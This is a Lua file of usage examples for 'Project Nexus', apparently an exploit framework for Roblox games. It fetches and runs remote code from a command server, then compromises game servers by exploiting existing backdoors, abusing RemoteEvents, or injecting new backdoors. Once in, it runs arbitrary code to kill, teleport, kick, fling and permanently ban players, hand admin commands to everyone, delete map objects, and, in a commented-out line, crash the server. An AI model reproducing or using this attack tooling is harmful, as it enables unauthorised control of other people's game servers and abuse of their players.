--[[
    Project Nexus - Basic Usage Examples
]]

-- Example 1: Quick load and auto-compromise
print("=== Example 1: Quick Load ===")
loadstring(game:HttpGet("http://localhost:8080/loader.lua"))()
-- That's it! Auto-initializes, scans, and compromises

-- Example 2: Manual control
print("\n=== Example 2: Manual Control ===")
local Nexus = loadstring(game:HttpGet("http://localhost:8080/main.lua"))()
local nexus = Nexus.new({
    commandServer = "http://localhost:8080",
    autoScan = false
})

nexus:Initialize()
local scanResults = nexus:ScanCurrentGame()
print("Game rating:", scanResults.rating)

if nexus:Compromise() then
    print("Compromised! Now executing commands...")
    
    -- Kill all players
    nexus:Execute([[
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.Character and player.Character:FindFirstChild("Humanoid") then
                player.Character.Humanoid.Health = 0
            end
        end
    ]])
end

-- Example 3: Specific compromise method
print("\n=== Example 3: Backdoor Exploitation ===")
local nexus2 = Nexus.new()
nexus2:Initialize()
nexus2:ScanCurrentGame()

-- Try existing backdoors first
if nexus2:Compromise("backdoor") then
    print("Exploited existing backdoor")
elseif nexus2:Compromise("remote") then
    print("Exploited RemoteEvent")
else
    print("Injecting new backdoor...")
    nexus2:Compromise("inject")
end

-- Example 4: Command shortcuts
print("\n=== Example 4: Quick Commands ===")
local nexus3 = _G.NexusInstance

-- Kill player
nexus3:Command("kill", "TargetPlayer")

-- Teleport player
nexus3:Command("tp", "Player1", Vector3.new(0, 100, 0))

-- Kick player
nexus3:Command("kick", "Player2", "You've been kicked!")

-- Inject admin commands
nexus3:Command("admin")
-- Now all players can use :kill, :tp, :god, :speed, etc.

-- Crash server
-- nexus3:Command("crash", "memory")  -- Uncomment to use

-- Example 5: Custom execution
print("\n=== Example 5: Custom Code ===")
nexus3:Execute([[
    -- Change baseplate color
    if workspace:FindFirstChild("Baseplate") then
        workspace.Baseplate.BrickColor = BrickColor.Random()
    end
    
    -- Give all players max speed
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("Humanoid") then
            player.Character.Humanoid.WalkSpeed = 200
        end
    end
    
    -- Spawn parts
    for i = 1, 10 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(4, 4, 4)
        part.Position = Vector3.new(math.random(-50, 50), 10, math.random(-50, 50))
        part.BrickColor = BrickColor.Random()
        part.Parent = workspace
    end
]])

-- Example 6: Monitoring and status
print("\n=== Example 6: Status Monitoring ===")
local status = nexus3:GetStatus()
print("Initialized:", status.initialized)
print("Compromised:", status.compromised)
print("Connected:", status.connected)
print("Executor active:", status.executor)

if status.game then
    print("Game ID:", status.game.placeId)
    print("Rating:", status.game.scanResults.rating)
end

-- Example 7: Targeted player manipulation
print("\n=== Example 7: Player Targeting ===")
local targetPlayer = "PlayerName"

-- Kill
nexus3.executor:KillPlayer(targetPlayer)

-- Teleport to specific coordinates
nexus3.executor:TeleportPlayer(targetPlayer, Vector3.new(0, 50, 0))

-- Give item (by asset ID)
nexus3.executor:GiveItem(targetPlayer, 123456)

-- Ban permanently
nexus3.executor:BanPlayer(targetPlayer)

-- Example 8: Mass player operations
print("\n=== Example 8: Mass Operations ===")
nexus3.executor:ExecuteOnAllPlayers([[
    -- Freeze all players
    character.Humanoid.WalkSpeed = 0
    character.Humanoid.JumpPower = 0
]])

nexus3.executor:ExecuteOnAllPlayers([[
    -- Fling all players
    local hrp = character:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.Velocity = Vector3.new(0, 500, 0)
    end
]])

-- Example 9: Workspace manipulation
print("\n=== Example 9: Workspace Control ===")
nexus3.executor:ManipulateWorkspace([[
    -- Delete all parts named "Wall"
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Part") and obj.Name == "Wall" then
            obj:Destroy()
        end
    end
    
    -- Anchor everything
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") then
            obj.Anchored = true
        end
    end
]])

-- Example 10: Cleanup and shutdown
print("\n=== Example 10: Shutdown ===")
-- When done, clean up
wait(60)  -- Let it run for 60 seconds
nexus3:Shutdown()
print("Nexus shut down cleanly")
